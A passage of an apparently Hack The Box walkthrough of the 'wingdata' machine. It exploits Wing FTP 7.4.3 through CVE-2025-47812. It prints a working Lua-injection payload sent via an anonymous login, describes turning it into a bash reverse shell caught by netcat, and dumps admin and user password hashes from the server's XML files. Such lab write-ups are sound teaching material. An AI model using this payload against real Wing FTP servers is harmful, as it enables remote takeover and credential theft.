+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       29w      359c http://wingdata.htb/assets/fonts =&gt; </span><span class="feroxbuster-yellow">http://wingdata.htb/assets/fonts/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       29w      353c http://wingdata.htb/vendor =&gt; </span><span class="feroxbuster-yellow">http://wingdata.htb/vendor/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       29w      360c http://wingdata.htb/vendor/jquery =&gt; </span><span class="feroxbuster-yellow">http://wingdata.htb/vendor/jquery/</span><span class="go">
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m    240045/240045  0s      </span><span class="feroxbuster-green">found</span><span class="go">:23      </span><span class="feroxbuster-red">errors</span><span class="go">:51137  
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   252/s   http://wingdata.htb/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   249/s   http://wingdata.htb/assets/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   250/s   http://wingdata.htb/assets/js/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   249/s   http://wingdata.htb/assets/css/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   248/s   http://wingdata.htb/assets/images/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   249/s   http://wingdata.htb/assets/fonts/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   250/s   http://wingdata.htb/vendor/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   248/s   http://wingdata.htb/vendor/jquery/ 
+</span></code></pre></div></div>
+
+<p>Nothing interesting.</p>
+
+<h3 id="ftpwingdatahtb---tcp-80">ftp.wingdata.htb - TCP 80</h3>
+
+<h4 id="site-1">Site</h4>
+
+<p>The site is an instance of <a href="https://www.wftpserver.com/">Wing FTP</a>:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618092436946.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618092436946.png" alt="image-20260618092436946" class="include_image " />
+</picture>
+
+<p>Not much I can do here without creds, but the standard anonymous FTP login (username “anonymous” with an empty password) does work to login:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618100210361.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618100210361.png" alt="image-20260618100210361" class="include_image " />
+</picture>
+
+<p>That’s the <a href="https://www.invicti.com/web-application-vulnerabilities/wing-ftp-anonymous-access">default behavior</a> in Wing FTP.</p>
+
+<h4 id="tech-stack-1">Tech Stack</h4>
+
+<p>The HTTP headers show the server as Wing FTP Server (Free Edition):</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">HTTP OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 18 Jun 2026 13:18:33 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Wing FTP Server(Free Edition)</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=31536000; includeSubDomains</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">678</span>
+</code></pre></div></div>
+
+<p>The version is given in the site footer as v7.4.3.</p>
+
+<p>The 404 returns with no body, just headers:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">404</span> <span class="ne">Not found</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 18 Jun 2026 13:34:02 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Wing FTP Server(Free Edition)</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/octet-stream</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=31536000; includeSubDomains</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+</code></pre></div></div>
+
+<p>This shows up in Firefox with their 404 page:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618093441855.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618093441855.png" alt="image-20260618093441855" class="include_image " />
+</picture>
+
+<p>I’ll skip the directory brute force on known software.</p>
+
+<h2 id="shell-as-wingftp">Shell as wingftp</h2>
+
+<h3 id="cve-identification">CVE Identification</h3>
+
+<p>Searching for “Wingftp v7.4.3 exploit” returns a lot of references to CVE-2025-47812:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618094703278.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618094703278.png" alt="image-20260618094703278" class="include_image " />
+</picture>
+
+<h3 id="cve-2025-47812-background">CVE-2025-47812 Background</h3>
+
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47812">CVE-2025-47812</a> is a remote code execution vulnerability in Wing FTP server before 7.4.4:</p>
+
+<blockquote>
+  <p>In Wing FTP Server before 7.4.4. the user and admin web interfaces mishandle ‘\0’ bytes, ultimately allowing injection of arbitrary Lua code into user session files. This can be used to execute arbitrary system commands with the privileges of the FTP service (root or SYSTEM by default). This is thus a remote code execution vulnerability that guarantees a total server compromise. This is also exploitable via anonymous FTP accounts.</p>
+</blockquote>
+
+<p>It mishandles null bytes allowing for arbitrary Lua code to be executed. This vulnerability got the rare 10.0 base score in CVSS. There were a lot of cybercrime actors using this vulnerability when it first became public in July 2025, and it was eventually added to the <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-47812">CISA KEV list</a>. RCE Security did a <a href="https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/">detailed writeup</a> on the vulnerability. All the writeups say that Wing FTP runs as root, so that should be interesting as well.</p>
+
+<p>When a user logs in, it creates a session file for that login named <code class="language-plaintext highlighter-rouge">&lt;cookie value&gt;.lua</code> that looks like this:</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span><span class="o">=</span><span class="s">[[&lt;username&gt;]]</span>
+<span class="n">_SESSION</span><span class="p">[</span><span class="s1">'ipaddress'</span><span class="p">]</span><span class="o">=</span><span class="s">[[192.168.1.100]]</span>
+<span class="n">_SESSION</span><span class="p">[</span><span class="s1">'currentpath'</span><span class="p">]</span><span class="o">=</span><span class="s">[[/]]</span>
+</code></pre></div></div>
+
+<p>When the user loads a page using that cookie, this Lua is run.</p>
+
+<p>Wings FTP didn’t handle the null byte in the username correctly. On the name check, it only checks up to the null byte. But the full string is written to the config file, allowing an attacker to craft a malicious login that injects code into the session file.</p>
+
+<h3 id="poc">POC</h3>
+
+<p>I need a valid username, but luckily for me, anonymous with a blank password will work here. I’ll create a payload that looks like:</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">anonymous</span><span class="err">\</span><span class="mi">0</span><span class="p">]]</span>
+<span class="kd">local</span> <span class="n">h</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">"id"</span><span class="p">)</span>
+<span class="kd">local</span> <span class="n">r</span> <span class="o">=</span> <span class="n">h</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*a"</span><span class="p">)</span>
+<span class="n">h</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+<span class="c1">--</span>
+</code></pre></div></div>
+
+<p>The username check will only check up until the null byte, seeing the username anonymous. When that writes to the session file, it will become:</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span><span class="o">=</span><span class="s">[[anonymous\0]]</span>
+<span class="kd">local</span> <span class="n">h</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">"id"</span><span class="p">)</span>
+<span class="kd">local</span> <span class="n">r</span> <span class="o">=</span> <span class="n">h</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*a"</span><span class="p">)</span>
+<span class="n">h</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+<span class="c1">--]]</span>
+<span class="n">_SESSION</span><span class="p">[</span><span class="s1">'ipaddress'</span><span class="p">]</span><span class="o">=</span><span class="s">[[10.10.14.51]]</span>
+<span class="n">_SESSION</span><span class="p">[</span><span class="s1">'currentpath'</span><span class="p">]</span><span class="o">=</span><span class="s">[[/]]</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">--</code> comments out the trailing <code class="language-plaintext highlighter-rouge">]]</code>. I’ll URL-encode this, and send it via Burp Repeater:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618121923335.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618121923335.png" alt="image-20260618121923335" class="include_image " />
+</picture>
+
+<p>Then I’ll load <code class="language-plaintext highlighter-rouge">/dir.html</code> (which I can see in Burp Proxy is the page loaded on login) with that cookie:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618122013716.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618122013716.png" alt="image-20260618122013716" class="include_image " />
+</picture>
+
+<p>At the top of the page, there’s the output of the <code class="language-plaintext highlighter-rouge">id</code> command. Interestingly, Wing FTP is not running as root. That’s likely an adjustment made for the HTB gameplay.</p>
+
+<h3 id="shell">Shell</h3>
+
+<p>I’ll simply update the command in Burp Repeater by replacing <code class="language-plaintext highlighter-rouge">id</code> with a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618124003645.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618124003645.png" alt="image-20260618124003645" class="include_image " />
+</picture>
+
+<p>It returns a new cookie, which I’ll place in the other Repeater tab to trigger:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618124030910.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618124030910.png" alt="image-20260618124030910" class="include_image " />
+</picture>
+
+<p>It just hangs, but at my <code class="language-plaintext highlighter-rouge">nc</code> there’s a reverse shell:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.244.106 48212
+bash: cannot set terminal process group (3560): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">wingftp@wingdata:/opt/wftpserver$</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>I’ll upgrade my shell using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">wingftp@wingdata:/$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+</span><span class="gp">            ‍</span>reset
+<span class="go">reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">wingftp@wingdata:/$</span><span class="w"> 
+</span></code></pre></div></div>
+
+<h2 id="shell-as-wacky">Shell as wacky</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<h4 id="users">Users</h4>
+
+<p>The wingftp user’s home directory is <code class="language-plaintext highlighter-rouge">/opt/wingftp</code>. In <code class="language-plaintext highlighter-rouge">/home</code>, there’s one home directory:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">wacky
+</span></code></pre></div></div>
+
+<p>wingftp can’t access it. wingftp, wacky, and root are the only users with shells set in <code class="language-plaintext highlighter-rouge">passwd</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh$'</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
+wacky:x:1001:1001::/home/wacky:/bin/bash
+</span></code></pre></div></div>
+
+<p>It’s a bit weird that wingftp has a shell.</p>
+
+<h4 id="wingftp">WingFTP</h4>
+
+<p>There’s nothing particularly interesting on the filesystem, other than in <code class="language-plaintext highlighter-rouge">/opt</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/opt$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 8
+drwxr-x--- 4 root    wacky   4096 Jan 12 08:43 backup_clients
+drwxr-x--- 9 wingftp wingftp 4096 Jun 18 08:17 wftpserver
+</span></code></pre></div></div>
+
+<p>I don’t have access to <code class="language-plaintext highlighter-rouge">backup_clients</code> (I’ll have to come back as wacky), and <code class="language-plaintext highlighter-rouge">wftpserver</code> is the installation directory for WingFTP (and the wingftp user’s home directory):</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/opt/wftpserver$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">Data         pid-wftpserver.pid  version.txt  wftp_default_ssh.key
+License.txt  README              webadmin     wftp_default_ssl.crt
+Log          session             webclient    wftp_default_ssl.key
+lua          session_admin       wftpconsole  wftpserver
+</span></code></pre></div></div>
+
+<p>WingFTP uses a file-based storage system instead of a database, which is in the <code class="language-plaintext highlighter-rouge">Data</code> directory. <code class="language-plaintext highlighter-rouge">_ADMINISTRATOR</code> has a file with config data on the admin users:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/opt/wftpserver/Data$</span><span class="w"> </span><span class="nb">ls </span>_ADMINISTRATOR/
+<span class="go">admins.xml    settings.xml
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">admins.xml</code> has a password hash:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
+<span class="nt">&lt;ADMIN_ACCOUNTS</span> <span class="na">Description=</span><span class="s">"Wing FTP Server Admin Accounts"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;ADMIN&gt;</span>
+        <span class="nt">&lt;Admin_Name&gt;</span>admin<span class="nt">&lt;/Admin_Name&gt;</span>
+        <span class="nt">&lt;Password&gt;</span>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba<span class="nt">&lt;/Password&gt;</span>
+        <span class="nt">&lt;Type&gt;</span>0<span class="nt">&lt;/Type&gt;</span>
+        <span class="nt">&lt;Readonly&gt;</span>0<span class="nt">&lt;/Readonly&gt;</span>
+        <span class="nt">&lt;IsDomainAdmin&gt;</span>0<span class="nt">&lt;/IsDomainAdmin&gt;</span>
+        <span class="nt">&lt;DomainList&gt;&lt;/DomainList&gt;</span>
+        <span class="nt">&lt;MyDirectory&gt;&lt;/MyDirectory&gt;</span>
+        <span class="nt">&lt;EnableTwoFactor&gt;</span>0<span class="nt">&lt;/EnableTwoFactor&gt;</span>
+        <span class="nt">&lt;TwoFactorCode&gt;&lt;/TwoFactorCode&gt;</span>
+    <span class="nt">&lt;/ADMIN&gt;</span>
+<span class="nt">&lt;/ADMIN_ACCOUNTS&gt;</span>
+</code></pre></div></div>
+
+<p>Similarly, the <code class="language-plaintext highlighter-rouge">1</code> directory has user information:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/opt/wftpserver/Data$</span><span class="w"> </span><span class="nb">ls </span>1 
+<span class="go">groups  portlistener.xml  settings.xml  users
+</span><span class="gp">wingftp@wingdata:/opt/wftpserver/Data$</span><span class="w"> </span><span class="nb">ls </span>1/users/
+<span class="go">anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
+</span></code></pre></div></div>
+
+<p>The user files are longer, but have the same <code class="language-plaintext highlighter-rouge">Password</code> field:</p>
+
+<div class="language-xml code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
+<span class="nt">&lt;USER_ACCOUNTS</span> <span class="na">Description=</span><span class="s">"Wing FTP Server User Accounts"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;USER&gt;</span>
+        <span class="nt">&lt;UserName&gt;</span>wacky<span class="nt">&lt;/UserName&gt;</span>
+        <span class="nt">&lt;EnableAccount&gt;</span>1<span class="nt">&lt;/EnableAccount&gt;</span>
+        <span class="nt">&lt;EnablePassword&gt;</span>1<span class="nt">&lt;/EnablePassword&gt;</span>
+        <span class="nt">&lt;Password&gt;</span>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca<span class="nt">&lt;/Password&gt;</span>
+        <span class="nt">&lt;ProtocolType&gt;</span>63<span class="nt">&lt;/ProtocolType&gt;</span>
+        <span class="nt">&lt;EnableExpire&gt;</span>0<span class="nt">&lt;/EnableExpire&gt;</span>
+        <span class="nt">&lt;ExpireTime&gt;</span>2025-12-02 12:02:46<span class="nt">&lt;/ExpireTime&gt;</span>
+        <span class="nt">&lt;MaxDownloadSpeedPerSession&gt;</span>0<span class="nt">&lt;/MaxDownloadSpeedPerSession&gt;</span>
+        <span class="nt">&lt;MaxUploadSpeedPerSession&gt;</span>0<span class="nt">&lt;/MaxUploadSpeedPerSession&gt;</span>
+        <span class="nt">&lt;MaxDownloadSpeedPerUser&gt;</span>0<span class="nt">&lt;/MaxDownloadSpeedPerUser&gt;</span>
+        <span class="nt">&lt;MaxUploadSpeedPerUser&gt;</span>0<span class="nt">&lt;/MaxUploadSpeedPerUser&gt;</span>
+        <span class="nt">&lt;SessionNoCommandTimeOut&gt;</span>5<span class="nt">&lt;/SessionNoCommandTimeOut&gt;</span>
+        <span class="nt">&lt;SessionNoTransferTimeOut&gt;</span>5<span class="nt">&lt;/SessionNoTransferTimeOut&gt;</span>
+        <span class="nt">&lt;MaxConnection&gt;</span>0<span class="nt">&lt;/MaxConnection&gt;</span>
+        <span class="nt">&lt;ConnectionPerIp&gt;</span>0<span class="nt">&lt;/ConnectionPerIp&gt;</span>
+        <span class="nt">&lt;PasswordLength&gt;</span>0<span class="nt">&lt;/PasswordLength&gt;</span>
+        <span class="nt">&lt;ShowHiddenFile&gt;</span>0<span class="nt">&lt;/ShowHiddenFile&gt;</span>
+        <span class="nt">&lt;CanChangePassword&gt;</span>0<span class="nt">&lt;/CanChangePassword&gt;</span>
+        <span class="nt">&lt;CanSendMessageToServer&gt;</span>0<span class="nt">&lt;/CanSendMessageToServer&gt;</span>
+        <span class="nt">&lt;EnableSSHPublicKeyAuth&gt;</span>0<span class="nt">&lt;/EnableSSHPublicKeyAuth&gt;</span>
+        <span class="nt">&lt;SSHPublicKeyPath&gt;&lt;/SSHPublicKeyPath&gt;</span>
+        <span class="nt">&lt;SSHAuthMethod&gt;</span>0<span class="nt">&lt;/SSHAuthMethod&gt;</span>
+        <span class="nt">&lt;EnableWeblink&gt;</span>1<span class="nt">&lt;/EnableWeblink&gt;</span>
+        <span class="nt">&lt;EnableUplink&gt;</span>1<span class="nt">&lt;/EnableUplink&gt;</span>
+        <span class="nt">&lt;EnableTwoFactor&gt;</span>0<span class="nt">&lt;/EnableTwoFactor&gt;</span>
+        <span class="nt">&lt;TwoFactorCode&gt;&lt;/TwoFactorCode&gt;</span>
+        <span class="nt">&lt;ExtraInfo&gt;&lt;/ExtraInfo&gt;</span>
+        <span class="nt">&lt;CurrentCredit&gt;</span>0<span class="nt">&lt;/CurrentCredit&gt;</span>
+        <span class="nt">&lt;RatioDownload&gt;</span>1<span class="nt">&lt;/RatioDownload&gt;</span>
+        <span class="nt">&lt;RatioUpload&gt;</span>1<span class="nt">&lt;/RatioUpload&gt;</span>
+        <span class="nt">&lt;RatioCountMethod&gt;</span>0<span class="nt">&lt;/RatioCountMethod&gt;</span>
+        <span class="nt">&lt;EnableRatio&gt;</span>0<span class="nt">&lt;/EnableRatio&gt;</span>
+        <span class="nt">&lt;MaxQuota&gt;</span>0<span class="nt">&lt;/MaxQuota&gt;</span>
+        <span class="nt">&lt;CurrentQuota&gt;</span>0<span class="nt">&lt;/CurrentQuota&gt;</span>
+        <span class="nt">&lt;EnableQuota&gt;</span>0<span class="nt">&lt;/EnableQuota&gt;</span>
+        <span class="nt">&lt;NotesName&gt;&lt;/NotesName&gt;</span>
+        <span class="nt">&lt;NotesAddress&gt;&lt;/NotesAddress&gt;</span>
+        <span class="nt">&lt;NotesZipCode&gt;&lt;/NotesZipCode&gt;</span>
+        <span class="nt">&lt;NotesPhone&gt;&lt;/NotesPhone&gt;</span>
+        <span class="nt">&lt;NotesFax&gt;&lt;/NotesFax&gt;</span>
+        <span class="nt">&lt;NotesEmail&gt;&lt;/NotesEmail&gt;</span>
+        <span class="nt">&lt;NotesMemo&gt;&lt;/NotesMemo&gt;</span>
+        <span class="nt">&lt;EnableUploadLimit&gt;</span>0<span class="nt">&lt;/EnableUploadLimit&gt;</span>
+        <span class="nt">&lt;CurLimitUploadSize&gt;</span>0<span class="nt">&lt;/CurLimitUploadSize&gt;</span>
+        <span class="nt">&lt;MaxLimitUploadSize&gt;</span>0<span class="nt">&lt;/MaxLimitUploadSize&gt;</span>
+        <span class="nt">&lt;EnableDownloadLimit&gt;</span>0<span class="nt">&lt;/EnableDownloadLimit&gt;</span>
+        <span class="nt">&lt;CurLimitDownloadLimit&gt;</span>0<span class="nt">&lt;/CurLimitDownloadLimit&gt;</span>
+        <span class="nt">&lt;MaxLimitDownloadLimit&gt;</span>0<span class="nt">&lt;/MaxLimitDownloadLimit&gt;</span>
+        <span class="nt">&lt;LimitResetType&gt;</span>0<span class="nt">&lt;/LimitResetType&gt;</span>
+        <span class="nt">&lt;LimitResetTime&gt;</span>1762103089<span class="nt">&lt;/LimitResetTime&gt;</span>
+        <span class="nt">&lt;TotalReceivedBytes&gt;</span>0<span class="nt">&lt;/TotalReceivedBytes&gt;</span>
+        <span class="nt">&lt;TotalSentBytes&gt;</span>0<span class="nt">&lt;/TotalSentBytes&gt;</span>
+        <span class="nt">&lt;LoginCount&gt;</span>2<span class="nt">&lt;/LoginCount&gt;</span>
+        <span class="nt">&lt;FileDownload&gt;</span>0<span class="nt">&lt;/FileDownload&gt;</span>
+        <span class="nt">&lt;FileUpload&gt;</span>0<span class="nt">&lt;/FileUpload&gt;</span>
+        <span class="nt">&lt;FailedDownload&gt;</span>0<span class="nt">&lt;/FailedDownload&gt;</span>
+        <span class="nt">&lt;FailedUpload&gt;</span>0<span class="nt">&lt;/FailedUpload&gt;</span>
+        <span class="nt">&lt;LastLoginIp&gt;</span>127.0.0.1<span class="nt">&lt;/LastLoginIp&gt;</span>
+        <span class="nt">&lt;LastLoginTime&gt;</span>2025-11-02 12:28:52<span class="nt">&lt;/LastLoginTime&gt;</span>
+        <span class="nt">&lt;EnableSchedule&gt;</span>0<span class="nt">&lt;/EnableSchedule&gt;</span>
+    <span class="nt">&lt;/USER&gt;</span>
+<span class="nt">&lt;/USER_ACCOUNTS&gt;</span>
+</code></pre></div></div>
+
+<p>I’ll pull all the passwords, as well as any salt settings:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/opt/wftpserver/Data$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-name</span> <span class="s1">'*.xml'</span> | xargs <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-e</span> salt <span class="nt">-e</span> password   
+<span class="go">./_ADMINISTRATOR/admins.xml:        &lt;Password&gt;a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba&lt;/Password&gt;
+./1/users/maria.xml:        &lt;EnablePassword&gt;1&lt;/EnablePassword&gt;
+./1/users/maria.xml:        &lt;Password&gt;a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03&lt;/Password&gt;
+./1/users/maria.xml:        &lt;PasswordLength&gt;0&lt;/PasswordLength&gt;
+./1/users/maria.xml:        &lt;CanChangePassword&gt;0&lt;/CanChangePassword&gt;
+./1/users/steve.xml:        &lt;EnablePassword&gt;1&lt;/EnablePassword&gt;
+./1/users/steve.xml:        &lt;Password&gt;5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca&lt;/Password&gt;
+./1/users/steve.xml:        &lt;PasswordLength&gt;0&lt;/PasswordLength&gt;
+./1/users/steve.xml:        &lt;CanChangePassword&gt;0&lt;/CanChangePassword&gt;
+./1/users/wacky.xml:        &lt;EnablePassword&gt;1&lt;/EnablePassword&gt;
+./1/users/wacky.xml:        &lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;
+./1/users/wacky.xml:        &lt;PasswordLength&gt;0&lt;/PasswordLength&gt;
+./1/users/wacky.xml:        &lt;CanChangePassword&gt;0&lt;/CanChangePassword&gt;
+./1/users/anonymous.xml:        &lt;EnablePassword&gt;0&lt;/EnablePassword&gt;
+./1/users/anonymous.xml:        &lt;Password&gt;d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca&lt;/Password&gt;
+./1/users/anonymous.xml:        &lt;PasswordLength&gt;0&lt;/PasswordLength&gt;
+./1/users/anonymous.xml:        &lt;CanChangePassword&gt;0&lt;/CanChangePassword&gt;
+./1/users/john.xml:        &lt;EnablePassword&gt;1&lt;/EnablePassword&gt;
+./1/users/john.xml:        &lt;Password&gt;c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10&lt;/Password&gt;
+./1/users/john.xml:        &lt;PasswordLength&gt;0&lt;/PasswordLength&gt;
+./1/users/john.xml:        &lt;CanChangePassword&gt;0&lt;/CanChangePassword&gt;
+./1/settings.xml:    &lt;MYSQL_Password&gt;&lt;/MYSQL_Password&gt;
+./1/settings.xml:    &lt;ODBC_DSN_Password&gt;&lt;/ODBC_DSN_Password&gt;
+./1/settings.xml:    &lt;Min_Password_Length&gt;0&lt;/Min_Password_Length&gt;
+./1/settings.xml:    &lt;Password_Have_Numerals&gt;0&lt;/Password_Have_Numerals&gt;
+./1/settings.xml:    &lt;Password_Have_Lowercase&gt;0&lt;/Password_Have_Lowercase&gt;
+./1/settings.xml:    &lt;Password_Have_Uppercase&gt;0&lt;/Password_Have_Uppercase&gt;
+./1/settings.xml:    &lt;Password_Have_Nonalphanumeric&gt;0&lt;/Password_Have_Nonalphanumeric&gt;
+./1/settings.xml:    &lt;Change_Password_Firstlogon&gt;0&lt;/Change_Password_Firstlogon&gt;
+./1/settings.xml:    &lt;EnablePasswordSalting&gt;1&lt;/EnablePasswordSalting&gt;
